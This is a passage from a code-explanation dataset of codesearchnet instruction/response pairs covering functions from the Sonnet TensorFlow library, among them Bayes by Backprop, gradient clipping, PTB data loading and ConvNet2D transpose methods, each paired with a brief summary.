Identical API to `posterior_builder`. See\n      `bbb.fixed_gaussian_prior_builder` (the default) for an example.\n    kl_builder: A builder function which receives the posterior distribution,\n      prior distribution, and a sample from the posterior. It returns a\n      scalar-shaped `tf.Tensor` representing the total KL cost for the\n      `tf.Variable` in question. See `bbb.stochastic_kl_builder` (default) and\n      `bbb.analytic_kl_builder` for examples.\n    sampling_mode_tensor: A `tf.Tensor` which determines how an estimate from\n      the posterior is produced. It must be scalar-shaped and have a `dtype` of\n      `tf.string`. Valid values for this tensor are `bbb.EstimatorModes.sample`\n      (which is the default), `bbb.EstimatorModes.mean`, and\n      `bbb.EstimatorModes.last_sample`. `bbb.EstimatorModes.sample` is\n      appropriate for training, and `bbb.EstimatorModes.mean` can be used\n      at test time.\n    fresh_noise_per_connection: A boolean. Indicates that each time a stochastic\n      variable is retrieved with this custom getter, new sampling noise should\n      be used. This is `True` by default. If this argument is set to `False`,\n      then the same noise is used for each connection. Note that this does not\n      apply to connections within a `tf.while_loop`; the same sampling noise\n      is always used in different iterations of a `tf.while_loop` within one\n      `session.run()` call. See the unit tests for details.\n    keep_control_dependencies: A boolean. This argument should only be\n      used by advanced users. Indicates that each time a stochastic variable is\n      retrieved in the loop body of a `tf.while_loop` construct, new sampling\n      noise should be used.\n      The default behavior is `False`, so that RNNs use the same weights at each\n      recurrent time step. This is done by removing the creation of the Variable\n      from any existing control flow contexts. Notably, the Variables will be\n      created outside the context of any tf.while_loop, making them fetchable.\n      When this argument is `True`, any Variables used in the loop body of a\n      `tf.while_loop` will be non-fetchable. If the KL cost needs to be\n      evaluated, the Variable must *first* be used *outside* the loop body. This\n      op using the Variable simply needs to be placed on the graph to get a\n      stochastic estimate of the KL; it doesn't need to ever be used. Example:\n\n      ```\n      def loop_body(i):\n        logits = sonnet_module(queue)\n        i = i + 1\n\n      with tf.variable_scope('bbb', custom_getter=bbb.bayes_by_backprop_getter(\n          fresh_noise_per_connection=True,\n          keep_control_dependencies=True)):\n        unused_op = sonnet_module(queue)  # Adds KL estimate to bbb Collection\n        final_i = tf.while_loop(lambda i: i < 5, loop_body, tf.constant(0.))\n      ```\n\n      Here when we add `unused_op` to the graph, we also add a number of tensors\n      associated with the particular stochastic variable, including its\n      contribution to the KL cost, to a graph-level registry. These are\n      organized in a per-stochastic-variable data structure and be accessed with\n      `bbb.get_variable_metadata()`. Without this line, these Tensors would\n      instead be added the first time the Variable is used in the while_loop,\n      which would make them non-fetchable.\n\n      In all cases, the KL cost is only added once per Variable, which is the\n      correct behavior, since if a variable is used multiple times in a model,\n      the KL cost should remain unaffected.\n\n  Returns:\n    A `custom_getter` function which implements Bayes by Backprop.\n  \"\"\"\n\n  if sampling_mode_tensor is None:\n    sampling_mode_tensor = tf.constant(EstimatorModes.sample)\n\n  def custom_getter(getter, name, *args, **kwargs):\n    \"\"\"The custom getter that will be returned.\"\"\"\n    if not kwargs.get(\"trainable\", True):\n      return getter(name, *args, **kwargs)\n    if kwargs[\"dtype\"] not in _OK_DTYPES_FOR_BBB:\n      raise ValueError(\"Disallowed data type {}.\".format(kwargs[\"dtype\"]))\n\n    var_scope = tf.get_variable_scope()\n    if var_scope.reuse and not fresh_noise_per_connection:\n      # Re-use the sampling noise by returning the very same posterior sample\n      # if configured to do so.\n      the_match = [\n          x for x in get_variable_metadata() if x.raw_variable_name == name]\n      if not the_match:\n        raise ValueError(\n            \"Internal error. No metadata for variable {}\".format(name))\n      if len(the_match) > 1:\n        raise ValueError(\n            \"Multiple matches for variable {}. Matches: {}\".format(\n                name, [x.raw_variable_name for x in the_match]))\n\n      return the_match[0].posterior_estimate\n\n    raw_variable_shape = kwargs[\"shape\"]\n\n    def construct_subgraph():\n      \"\"\"Constructs subgraph used to reparameterize the variable in question.\"\"\"\n      posterior = posterior_builder(\n          getter,\n          name=name,\n          *args, **kwargs)\n      prior = prior_builder(\n          getter,\n          name=name,\n          *args, **kwargs)\n\n      # If the user does not return an extra dictionary of prior variables,\n      # then fill in an empty dictionary.\n      if isinstance(posterior, collections.Sequence):\n        posterior_dist, posterior_vars = posterior\n      else:\n        posterior_dist, posterior_vars = posterior, {}\n\n      if isinstance(prior, collections.Sequence):\n        prior_dist, prior_vars = prior\n      else:\n        prior_dist, prior_vars = prior, {}\n\n      if posterior_dist.reparameterization_type != _OK_PZATION_TYPE:\n        raise ValueError(\n            \"Distribution {} incompatible with Bayes by Backprop.\".format(\n                posterior_dist.__class__.__name__))\n\n      posterior_estimator = _produce_posterior_estimate(posterior_dist,\n                                                        sampling_mode_tensor,\n                                                        name)\n      kl_cost = kl_builder(posterior_dist, prior_dist, posterior_estimator)\n      variable_metadata = _VariableMetadata(\n          raw_variable_name=name,\n          raw_variable_shape=raw_variable_shape,\n          scope_name=var_scope.name,\n          posterior=posterior_dist,\n          posterior_estimate=posterior_estimator,\n          prior=prior_dist,\n          kl_cost=kl_cost,\n          prior_vars=prior_vars,\n          posterior_vars=posterior_vars)\n      return posterior_estimator, variable_metadata\n\n    # Entering the `tf.control_dependencies(None)` context is crucial to\n    # provide compatibility with `tf.while_loop` and thus RNNs. The main thing\n    # it does is making the `kl_cost` fetchable by causing these ops to be\n    # created outside the context of any tf.while_loop. Note also that it causes\n    # a RNN core's weights to be sampled just once when unrolled over a\n    # sequence, rather than at every timestep.\n    control_deps = [] if keep_control_dependencies else None\n    with tf.control_dependencies(control_deps):\n      posterior_estimator, var_metadata = construct_subgraph()\n\n    # Only add these ops to a collection once per unique variable.\n    # This is to ensure that KL costs are not tallied up more than once.\n    var_with_name = _all_var_metadata_registry[tf.get_default_graph()].get(name)\n    if var_with_name is None:\n      _all_var_metadata_registry[tf.get_default_graph()][name] = var_metadata\n\n    return posterior_estimator\n  return custom_getter", "response": "Creates a custom getter which does Bayes by Backprop."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _produce_posterior_estimate(posterior_dist, posterior_estimate_mode,\n                                raw_var_name):\n  \"\"\"Create tensor representing estimate of posterior.\n\n  Args:\n    posterior_dist: An instance of `tfp.distributions.Distribution`.\n        The variational posterior from which to produce an estimate of the\n        variable in question.\n    posterior_estimate_mode: A `Tensor` of dtype `tf.string`, which\n        determines the inference mode.\n    raw_var_name: The name of the variable over which inference is done.\n\n  Returns:\n    `z_sample`, a `Tensor` representing an estimate derived from the\n        posterior distribution.\n  \"\"\"\n  conds = [\n      tf.equal(posterior_estimate_mode,\n               tf.constant(EstimatorModes.sample),\n               name=\"equal_sample_mode\"),\n      tf.equal(posterior_estimate_mode,\n               tf.constant(EstimatorModes.mean),\n               name=\"equal_mean_mode\"),\n      tf.equal(posterior_estimate_mode,\n               tf.constant(EstimatorModes.last_sample),\n               name=\"equal_last_sample_mode\"),\n  ]\n  # pylint: disable=unnecessary-lambda\n  results = [\n      lambda: posterior_dist.sample(),\n      lambda: posterior_dist.mean(),\n      lambda: posterior_dist.last_sample()\n  ]\n\n  def default_case_branch_raising_error():\n    err_msg = \"Invalid posterior estimate mode.\"\n    raise_err = tf.Assert(tf.constant(False), data=[tf.constant(err_msg)])\n    with tf.control_dependencies([raise_err]):\n      return posterior_dist.mean()\n\n  if hasattr(posterior_dist, \"last_sample\"):\n    cases = {conds[0]: results[0], conds[1]: results[1], conds[2]: results[2]}\n  else:\n    cases = {conds[0]: results[0], conds[1]: results[1]}\n  z_sample = tf.case(\n      cases,\n      exclusive=True,\n      default=default_case_branch_raising_error,\n      name=\"{}_posterior_estimate\".format(raw_var_name))\n  # pylint: enable=unnecessary-lambda\n  return z_sample", "response": "Create a tensor representing an estimate of the posterior."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_total_kl_cost(name=\"total_kl_cost\", filter_by_name_substring=None):\n  all_variable_metadata = get_variable_metadata(filter_by_name_substring)\n  if not all_variable_metadata:\n    tf.logging.warning(\"No Bayes by Backprop variables found!\")\n    return tf.constant(0.0, shape=())\n  return tf.add_n([md.kl_cost for md in all_variable_metadata], name=name)", "response": "Returns the total KL cost for all variables in the current graph."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef output_shape(self):\n    return (self._block_shape[0] * self._block_rows,\n            self._block_shape[1] * self._block_rows)", "response": "The shape of the output matrix."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _left_zero_blocks(self, r):\n    if not self._include_off_diagonal:\n      return r\n    elif not self._upper:\n      return 0\n    elif self._include_diagonal:\n      return r\n    else:\n      return r + 1", "response": "Number of blocks with zeros from the left in block row r."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _right_zero_blocks(self, r):\n    if not self._include_off_diagonal:\n      return self._block_rows - r - 1\n    elif self._upper:\n      return 0\n    elif self._include_diagonal:\n      return self._block_rows - r - 1\n    else:\n      return self._block_rows - r", "response": "Number of blocks with zeros from the right in block row r."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nnumbers of content blocks in block row r.", "response": "def _content_blocks(self, r):\n    \"\"\"Number of content blocks in block row `r`.\"\"\"\n    return (self._block_rows - self._left_zero_blocks(r)\n            - self._right_zero_blocks(r))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct the data model loss and optimizer then train.", "response": "def build_and_train(iterations, log_stride, test=False):\n  \"\"\"Construct the data, model, loss and optimizer then train.\"\"\"\n\n  # Test mode settings.\n  batch_size = 2 if test else FLAGS.batch_size\n  num_mems = 2 if test else FLAGS.num_mems\n  num_heads = 1 if test else FLAGS.num_mems\n  num_blocks = 1 if test else FLAGS.num_mems\n  head_size = 4 if test else FLAGS.head_size\n  num_objects = 2 if test else FLAGS.num_objects\n  num_features = 4 if test else FLAGS.num_features\n  mlp_size = (20,) if test else (256, 256, 256, 256)\n\n  with tf.Graph().as_default():\n    t0 = time.time()\n\n    # Initialize the dataset.\n    dataset = dataset_nth_farthest.NthFarthest(\n        batch_size, num_objects, num_features)\n\n    # Create the model.\n    core = snt.RelationalMemory(\n        mem_slots=num_mems,\n        head_size=head_size,\n        num_heads=num_heads,\n        num_blocks=num_blocks,\n        gate_style=FLAGS.gate_style)\n\n    final_mlp = snt.nets.MLP(\n        output_sizes=mlp_size,\n        activate_final=True)\n\n    model = SequenceModel(\n        core=core,\n        target_size=num_objects,\n        final_mlp=final_mlp)\n\n    tf.logging.info(\"Instantiated models ({:3f})\".format(time.time() - t0))\n\n    # Get train and test data.\n    inputs_train, labels_train = dataset.get_batch()\n    inputs_test, labels_test = dataset.get_batch()\n\n    # Define target accuracy.\n    def compute_accuracy(logits, targets, name=\"accuracy\"):\n      correct_pred = tf.cast(\n          tf.equal(tf.cast(targets, tf.int64), tf.argmax(logits, 1)),\n          tf.float32)\n      return tf.reduce_mean(correct_pred, name=name)\n\n    # Define the loss & accuracy.\n    def loss_fn(inputs, labels):\n      \"\"\"Creates the loss and the exports.\"\"\"\n      logits = model(inputs)\n      labels = tf.cast(labels, tf.int32)\n      loss = tf.reduce_mean(tf.nn.sparse_softmax_cross_entropy_with_logits(\n          logits=logits, labels=labels))\n      accuracy = compute_accuracy(logits, labels)\n      return loss, accuracy\n\n    # Get training step counter.\n    global_step = tf.get_variable(\n        name=\"global_step\",\n        shape=[],\n        dtype=tf.int64,\n        initializer=tf.zeros_initializer(),\n        trainable=False,\n        collections=[tf.GraphKeys.GLOBAL_VARIABLES, tf.GraphKeys.GLOBAL_STEP])\n\n    # Create the optimizer.\n    learning_rate_op = tf.reduce_max([\n        tf.train.exponential_decay(\n            FLAGS.learning_rate,\n            global_step,\n            decay_steps=FLAGS.epochs // 100,\n            decay_rate=0.9,\n            staircase=False),\n        FLAGS.min_learning_rate\n    ])\n    optimizer = tf.train.AdamOptimizer(learning_rate_op)\n    train_loss, _ = loss_fn(inputs_train, labels_train)\n    step_op = optimizer.minimize(train_loss, global_step=global_step)\n\n    # Compute test accuracy\n    logits_test = model(inputs_test)\n    labels_test = tf.cast(labels_test, tf.int32)\n    test_acc = compute_accuracy(logits_test, labels_test)\n\n    tf.logging.info(\"Created losses and optimizers ({:3f})\".format(\n        time.time() - t0))\n\n    # Begin Training.\n    t0 = time.time()\n    train_losses = []\n    steps = []\n    test_accs = []\n    tf.logging.info(\"Starting training ({:3f})\".format(time.time() - t0))\n    with tf.train.SingularMonitoredSession() as sess:\n      for it in six.moves.range(iterations):\n        sess.run([step_op, learning_rate_op])\n        if it % log_stride == 0:\n          loss_v, acc_v = sess.run([train_loss, test_acc])\n          elapsed = time.time() - t0\n          tf.logging.info(\n              \"iter: {:2d}, train loss {:3f}; test acc {:3f} ({:3f})\".format(\n                  it, loss_v, acc_v, elapsed))\n          train_losses.append(loss_v)\n          steps.append(it)\n        test_accs.append(acc_v)\n  return steps, train_losses, test_accs"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _clip_gradient_op(dtype):\n\n  def clip_gradient_backward(op, grad):\n    clip_value_min = op.inputs[1]\n    clip_value_max = op.inputs[2]\n    clipped_grad = tf.clip_by_value(grad, clip_value_min, clip_value_max)\n    return clipped_grad, None, None\n\n  def clip_gradient_forward(x, clip_value_min, clip_value_max):\n    del clip_value_min  # Unused.\n    del clip_value_max  # Unused.\n    return x\n\n  func_name = \"ClipGradient_{}\".format(dtype.name)\n  return function.Defun(\n      dtype, dtype, dtype,\n      python_grad_func=clip_gradient_backward,\n      func_name=func_name)(clip_gradient_forward)", "response": "Create an op that clips gradients using a Defun."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef clip_gradient(net, clip_value_min, clip_value_max, name=None):\n  if not net.dtype.is_floating:\n    raise ValueError(\"clip_gradient does not support non-float `net` inputs.\")\n\n  with tf.name_scope(name, \"clip_gradient\", values=[net]):\n    dtype = net.dtype.base_dtype  # Convert ref dtypes to regular dtypes.\n    min_tensor = tf.convert_to_tensor(clip_value_min, dtype=dtype)\n    max_tensor = tf.convert_to_tensor(clip_value_max, dtype=dtype)\n\n    clip_gradient_op = _clip_gradient_op(dtype)\n    output = clip_gradient_op(net, min_tensor, max_tensor)\n    output.set_shape(net.get_shape())\n\n  return output", "response": "Clips respective gradients of a given tensor."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef ptb_raw_data(data_path):\n\n  train_path = os.path.join(data_path, \"ptb.train.txt\")\n  valid_path = os.path.join(data_path, \"ptb.valid.txt\")\n  test_path = os.path.join(data_path, \"ptb.test.txt\")\n\n  word_to_id = _build_vocab(train_path)\n  train_data = _file_to_word_ids(train_path, word_to_id)\n  valid_data = _file_to_word_ids(valid_path, word_to_id)\n  test_data = _file_to_word_ids(test_path, word_to_id)\n  return train_data, valid_data, test_data, word_to_id", "response": "Loads PTB raw data from data directory data_path."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _check_and_assign_normalization_members(self, normalization_ctor,\n                                              normalization_kwargs):\n    \"\"\"Checks that the normalization constructor is callable.\"\"\"\n    if isinstance(normalization_ctor, six.string_types):\n      normalization_ctor = util.parse_string_to_constructor(normalization_ctor)\n    if normalization_ctor is not None and not callable(normalization_ctor):\n      raise ValueError(\n          \"normalization_ctor must be a callable or a string that specifies \"\n          \"a callable, got {}.\".format(normalization_ctor))\n    self._normalization_ctor = normalization_ctor\n    self._normalization_kwargs = normalization_kwargs", "response": "Checks that the normalization constructor is callable and assigns the normalization members to the object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _parse_normalization_kwargs(self, use_batch_norm, batch_norm_config,\n                                  normalization_ctor, normalization_kwargs):\n    \"\"\"Sets up normalization, checking old and new flags.\"\"\"\n    if use_batch_norm is not None:\n      # Delete this whole block when deprecation is done.\n      util.deprecation_warning(\n          \"`use_batch_norm` kwarg is deprecated. Change your code to instead \"\n          \"specify `normalization_ctor` and `normalization_kwargs`.\")\n      if not use_batch_norm:\n        # Explicitly set to False - normalization_{ctor,kwargs} has precedence.\n        self._check_and_assign_normalization_members(normalization_ctor,\n                                                     normalization_kwargs or {})\n      else:  # Explicitly set to true - new kwargs must not be used.\n        if normalization_ctor is not None or normalization_kwargs is not None:\n          raise ValueError(\n              \"if use_batch_norm is specified, normalization_ctor and \"\n              \"normalization_kwargs must not be.\")\n        self._check_and_assign_normalization_members(batch_norm.BatchNorm,\n                                                     batch_norm_config or {})\n    else:\n      # Old kwargs not set, this block will remain after removing old kwarg.\n      self._check_and_assign_normalization_members(normalization_ctor,\n                                                   normalization_kwargs or {})", "response": "Sets up normalization checking old and new flags."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _instantiate_layers(self):\n\n    # Here we are entering the module's variable scope to name our submodules\n    # correctly (not to create variables). As such it's safe to not check\n    # whether we're in the same graph. This is important if we're constructing\n    # the module in one graph and connecting it in another (e.g. with `defun`\n    # the module is created in some default graph, and connected to a capturing\n    # graph in order to turn it into a graph function).\n    with self._enter_variable_scope(check_same_graph=False):\n      self._layers = tuple(conv.Conv2D(name=\"conv_2d_{}\".format(i),  # pylint: disable=g-complex-comprehension\n                                       output_channels=self._output_channels[i],\n                                       kernel_shape=self._kernel_shapes[i],\n                                       stride=self._strides[i],\n                                       rate=self._rates[i],\n                                       padding=self._paddings[i],\n                                       use_bias=self._use_bias[i],\n                                       initializers=self._initializers,\n                                       partitioners=self._partitioners,\n                                       regularizers=self._regularizers,\n                                       data_format=self._data_format)\n                           for i in xrange(self._num_layers))", "response": "Instantiates all the convolutional modules used in the network."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _build(self, inputs, **normalization_build_kwargs):\n    if (self._normalization_ctor in {batch_norm.BatchNorm,\n                                     batch_norm_v2.BatchNormV2} and\n        \"is_training\" not in normalization_build_kwargs):\n      raise ValueError(\"Boolean is_training flag must be explicitly specified \"\n                       \"when using batch normalization.\")\n\n    self._input_shape = tuple(inputs.get_shape().as_list())\n    net = inputs\n\n    final_index = len(self._layers) - 1\n    for i, layer in enumerate(self._layers):\n      net = layer(net)\n\n      if i != final_index or self._normalize_final:\n        if self._normalization_ctor is not None:\n          # The name 'batch_norm' is used even if something else like\n          # LayerNorm is being used. This is to avoid breaking old checkpoints.\n          normalizer = self._normalization_ctor(\n              name=\"batch_norm_{}\".format(i),\n              **self._normalization_kwargs)\n\n          net = normalizer(\n              net, **util.remove_unsupported_kwargs(\n                  normalizer, normalization_build_kwargs))\n        else:\n          if normalization_build_kwargs:\n            tf.logging.warning(\n                \"No normalization configured, but extra kwargs \"\n                \"provided: {}\".format(normalization_build_kwargs))\n\n      if i != final_index or self._activate_final:\n        net = self._activation(net)\n\n    return net", "response": "Assembles the ConvNet2D and connects it to the graph."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _transpose(self,\n                 transpose_constructor,\n                 name=None,\n                 output_channels=None,\n                 kernel_shapes=None,\n                 strides=None,\n                 paddings=None,\n                 activation=None,\n                 activate_final=None,\n                 normalization_ctor=None,\n                 normalization_kwargs=None,\n                 normalize_final=None,\n                 initializers=None,\n                 partitioners=None,\n                 regularizers=None,\n                 use_bias=None,\n                 data_format=None):\n    \"\"\"Returns transposed version of this network.\n\n    Args:\n      transpose_constructor: A method that creates an instance of the transposed\n        network type. The method must accept the same kwargs as this methods\n        with the exception of the `transpose_constructor` argument.\n      name: Optional string specifying the name of the transposed module. The\n        default name is constructed by appending \"_transpose\"\n        to `self.module_name`.\n      output_channels: Optional iterable of numbers of output channels.\n      kernel_shapes: Optional iterable of kernel sizes. The default value is\n        constructed by reversing `self.kernel_shapes`.\n      strides: Optional iterable of kernel strides. The default value is\n        constructed by reversing `self.strides`.\n      paddings: Optional iterable of padding options, either `snt.SAME` or\n        `snt.VALID`; The default value is constructed by reversing\n        `self.paddings`.\n      activation: Optional activation op. Default value is `self.activation`.\n      activate_final: Optional boolean determining if the activation and batch\n        normalization, if turned on, are applied to the final layer.\n      normalization_ctor: Constructor to return a callable which will perform\n        normalization at each layer. Defaults to None / no normalization.\n        Examples of what could go here: `snt.BatchNormV2`, `snt.LayerNorm`. If\n        a string is provided, importlib is used to convert the string to a\n        callable, so either `snt.LayerNorm` or `\"snt.LayerNorm\"` can be\n        provided.\n      normalization_kwargs: kwargs to be provided to `normalization_ctor` when\n        it is called.\n      normalize_final: Whether to apply normalization after the final conv\n        layer. Default is to take the value of activate_final.\n      initializers: Optional dict containing ops to initialize the filters of\n        the whole network (with key 'w') or biases (with key 'b'). The default\n        value is `self.initializers`.\n      partitioners: Optional dict containing partitioners to partition\n        weights (with key 'w') or biases (with key 'b'). The default value is\n        `self.partitioners`.\n      regularizers: Optional dict containing regularizers for the filters of the\n        whole network (with key 'w') or biases (with key 'b'). The default is\n        `self.regularizers`.\n      use_bias: Optional boolean or iterable of booleans determining whether to\n        include bias parameters in the convolutional layers. Default\n        is constructed by reversing `self.use_bias`.\n      data_format: Optional string, one of \"NCHW\" or \"NHWC\". Specifies whether\n        the channel dimension of the input and output is the last dimension.\n        Default is `self._data_format`.\n    Returns:\n      Matching transposed module.\n\n    Raises:\n      ValueError: If output_channels is specified and its length does not match\n        the number of layers.\n    \"\"\"\n\n    if data_format is None:\n      data_format = self._data_format\n\n    if output_channels is None:\n      output_channels = []\n      channel_dim = -1 if data_format == DATA_FORMAT_NHWC else 1\n      for layer in reversed(self._layers):\n        output_channels.append(lambda l=layer: l.input_shape[channel_dim])\n\n    elif len(output_channels) != len(self._layers):\n      # Note that we only have to do this check for the output channels. Any\n      # other inconsistencies will be picked up by ConvNet2D.__init__.\n      raise ValueError(\"Iterable output_channels length must match the \"\n                       \"number of layers ({}), but is {} instead.\".format(\n                           len(self._layers), len(output_channels)))\n\n    if kernel_shapes is None:\n      kernel_shapes = reversed(self.kernel_shapes)\n\n    if strides is None:\n      strides = reversed(self.strides)\n\n    if paddings is None:\n      paddings = reversed(self.paddings)\n\n    if activation is None:\n      activation = self.activation\n\n    if activate_final is None:\n      activate_final = self.activate_final\n\n    if normalization_ctor is None:\n      normalization_ctor = self.normalization_ctor\n\n    if normalization_kwargs is None:\n      normalization_kwargs = self.normalization_kwargs\n\n    if normalize_final is None:\n      normalize_final = self.normalize_final\n\n    if initializers is None:\n      initializers = self.initializers\n\n    if partitioners is None:\n      partitioners = self.partitioners\n\n    if regularizers is None:\n      regularizers = self.regularizers\n\n    if use_bias is None:\n      use_bias = reversed(self.use_bias)\n\n    if name is None:\n      name = self.module_name + \"_transpose\"\n\n    return transpose_constructor(\n        output_channels=output_channels,\n        kernel_shapes=kernel_shapes,\n        strides=strides,\n        paddings=paddings,\n        activation=activation,\n        activate_final=activate_final,\n        normalization_ctor=normalization_ctor,\n        normalization_kwargs=normalization_kwargs,\n        normalize_final=normalize_final,\n        initializers=initializers,\n        partitioners=partitioners,\n        regularizers=regularizers,\n        use_bias=use_bias,\n        data_format=data_format,\n        name=name)", "response": "Returns a new version of the network with the specified parameters."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a new version of the network with the same name and parameters.", "response": "def transpose(self,\n                name=None,\n                output_channels=None,\n                kernel_shapes=None,\n                strides=None,\n                paddings=None,\n                activation=None,\n                activate_final=None,\n                normalization_ctor=None,\n                normalization_kwargs=None,\n                normalize_final=None,\n                initializers=None,\n                partitioners=None,\n                regularizers=None,\n                use_batch_norm=None,\n                use_bias=None,\n                batch_norm_config=None,\n                data_format=None,\n                custom_getter=None):\n    \"\"\"Returns transposed version of this network.\n\n    Args:\n      name: Optional string specifying the name of the transposed module. The\n        default name is constructed by appending \"_transpose\"\n        to `self.module_name`.\n      output_channels: Optional iterable of numbers of output channels.\n      kernel_shapes: Optional iterable of kernel sizes. The default value is\n        constructed by reversing `self.kernel_shapes`.\n      strides: Optional iterable of kernel strides. The default value is\n        constructed by reversing `self.strides`.\n      paddings: Optional iterable of padding options, either `snt.SAME` or\n        `snt.VALID`; The default value is constructed by reversing\n        `self.paddings`.\n      activation: Optional activation op. Default value is `self.activation`.\n      activate_final: Optional boolean determining if the activation and batch\n        normalization, if turned on, are applied to the final layer.\n      normalization_ctor: Constructor to return a callable which will perform\n        normalization at each layer. Defaults to None / no normalization.\n        Examples of what could go here: `snt.BatchNormV2`, `snt.LayerNorm`. If\n        a string is provided, importlib is used to convert the string to a\n        callable, so either `snt.LayerNorm` or `\"snt.LayerNorm\"` can be\n        provided.\n      normalization_kwargs: kwargs to be provided to `normalization_ctor` when\n        it is called.\n      normalize_final: Whether to apply normalization after the final conv\n        layer. Default is to take the value of activate_final.\n      initializers: Optional dict containing ops to initialize the filters of\n        the whole network (with key 'w') or biases (with key 'b'). The default\n        value is `self.initializers`.\n      partitioners: Optional dict containing partitioners to partition\n        weights (with key 'w') or biases (with key 'b'). The default value is\n        `self.partitioners`.\n      regularizers: Optional dict containing regularizers for the filters of the\n        whole network (with key 'w') or biases (with key 'b'). The default is\n        `self.regularizers`.\n      use_batch_norm: Optional boolean determining if batch normalization is\n        applied after convolution. The default value is `self.use_batch_norm`.\n      use_bias: Optional boolean or iterable of booleans determining whether to\n        include bias parameters in the convolutional layers. Default\n        is constructed by reversing `self.use_bias`.\n      batch_norm_config: Optional mapping of additional configuration for the\n        `snt.BatchNorm` modules. Default is `self.batch_norm_config`.\n      data_format: Optional string, one of \"NCHW\" or \"NHWC\". Specifies whether\n        the channel dimension of the input and output is the last dimension.\n        Default is `self._data_format`.\n      custom_getter: Callable or dictionary of callables to use as\n        custom getters inside the module. If a dictionary, the keys\n        correspond to regexes to match variable names. See the\n        `tf.get_variable` documentation for information about the\n        custom_getter API.\n\n    Returns:\n      Matching `ConvNet2DTranspose` module.\n\n    Raises:\n      ValueError: If output_channels is specified and its length does not match\n        the number of layers.\n      ValueError: If the given data_format is not a supported format (\"NHWC\" or\n        \"NCHW\").\n      NotImplementedError: If the convolutions are dilated.\n    \"\"\"\n    for rate in self._rates:\n      if rate != 1:\n        raise NotImplementedError(\"Transpose dilated convolutions \"\n                                  \"are not supported\")\n    output_shapes = []\n    if data_format is None:\n      data_format = self._data_format\n    if data_format == DATA_FORMAT_NHWC:\n      start_dim, end_dim = 1, -1\n    elif data_format == DATA_FORMAT_NCHW:\n      start_dim, end_dim = 2, 4\n    else:\n      raise ValueError(\"Invalid data_format {:s}. Allowed formats \"\n                       \"{}\".format(data_format, SUPPORTED_2D_DATA_FORMATS))\n\n    if custom_getter is None and self._custom_getter is not None:\n      tf.logging.warning(\n          \"This convnet was constructed with a custom getter, but the \"\n          \"`transpose` method was not given any. The transposed ConvNet will \"\n          \"not be using any custom_getter.\")\n\n    for layer in reversed(self._layers):\n      output_shapes.append(lambda l=layer: l.input_shape[start_dim:end_dim])\n    transpose_constructor = functools.partial(ConvNet2DTranspose,\n                                              output_shapes=output_shapes,\n                                              custom_getter=custom_getter)\n\n    return self._transpose(\n        transpose_constructor=transpose_constructor,\n        name=name,\n        output_channels=output_channels,\n        kernel_shapes=kernel_shapes,\n        strides=strides,\n        paddings=paddings,\n        activation=activation,\n        activate_final=activate_final,\n        normalization_ctor=normalization_ctor,\n        normalization_kwargs=normalization_kwargs,\n        normalize_final=normalize_final,\n        initializers=initializers,\n        partitioners=partitioners,\n        regularizers=regularizers,\n        use_bias=use_bias,\n        data_format=data_format)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a new version of the network with the same name and parameters.", "response": "def transpose(self,\n                name=None,\n                output_channels=None,\n                kernel_shapes=None,\n                strides=None,\n                paddings=None,\n                activation=None,\n                activate_final=None,\n                normalization_ctor=None,\n                normalization_kwargs=None,\n                normalize_final=None,\n                initializers=None,\n                partitioners=None,\n                regularizers=None,\n                use_batch_norm=None,\n                use_bias=None,\n                batch_norm_config=None,\n                data_format=None,\n                custom_getter=None):\n    \"\"\"Returns transposed version of this network.\n\n    Args:\n      name: Optional string specifying the name of the transposed module. The\n        default name is constructed by appending \"_transpose\"\n        to `self.module_name`.\n      output_channels: Optional iterable of numbers of output channels.\n      kernel_shapes: Optional iterable of kernel sizes. The default value is\n        constructed by reversing `self.kernel_shapes`.\n      strides: Optional iterable of kernel strides. The default value is\n        constructed by reversing `self.strides`.\n      paddings: Optional iterable of padding options, either `snt.SAME` or\n        `snt.VALID`; The default value is constructed by reversing\n        `self.paddings`.\n      activation: Optional activation op. Default value is `self.activation`.\n      activate_final: Optional boolean determining if the activation and batch\n        normalization, if turned on, are applied to the final layer.\n      normalization_ctor: Constructor to return a callable which will perform\n        normalization at each layer. Defaults to None / no normalization.\n        Examples of what could go here: `snt.BatchNormV2`, `snt.LayerNorm`. If\n        a string is provided, importlib is used to convert the string to a\n        callable, so either `snt.LayerNorm` or `\"snt.LayerNorm\"` can be\n        provided.\n      normalization_kwargs: kwargs to be provided to `normalization_ctor` when\n        it is called.\n      normalize_final: Whether to apply normalization after the final conv\n        layer. Default is to take the value of activate_final.\n      initializers: Optional dict containing ops to initialize the filters of\n        the whole network (with key 'w') or biases (with key 'b'). The default\n        value is `self.initializers`.\n      partitioners: Optional dict containing partitioners to partition\n        weights (with key 'w') or biases (with key 'b'). The default value is\n        `self.partitioners`.\n      regularizers: Optional dict containing regularizers for the filters of the\n        whole network (with key 'w') or biases (with key 'b'). The default is\n        `self.regularizers`.\n      use_batch_norm: Optional boolean determining if batch normalization is\n        applied after convolution. The default value is `self.use_batch_norm`.\n      use_bias: Optional boolean or iterable of booleans determining whether to\n        include bias parameters in the convolutional layers. Default\n        is constructed by reversing `self.use_bias`.\n      batch_norm_config: Optional mapping of additional configuration for the\n        `snt.BatchNorm` modules. Default is `self.batch_norm_config`.\n      data_format: Optional string, one of \"NCHW\" or 